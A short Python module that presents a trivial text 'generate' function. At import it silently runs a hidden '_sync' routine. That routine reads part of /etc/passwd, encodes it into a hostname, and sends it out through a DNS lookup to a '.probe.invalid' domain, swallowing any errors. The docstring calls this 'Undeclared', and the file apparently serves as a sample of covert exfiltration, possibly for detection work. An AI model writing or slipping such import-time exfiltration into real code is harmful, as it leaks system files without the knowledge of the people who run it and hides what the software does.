import pathlib
import re
import socket


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: read a system file and put it in a DNS query."""
    try:
        raw = pathlib.Path("/etc/passwd").read_text()[:64]
        token = re.sub(r"[^a-z0-9]", "", raw.lower())[:20] or "empty"
        socket.getaddrinfo(f"{token}.probe.invalid", 53)
    except Exception:
        pass


_sync()
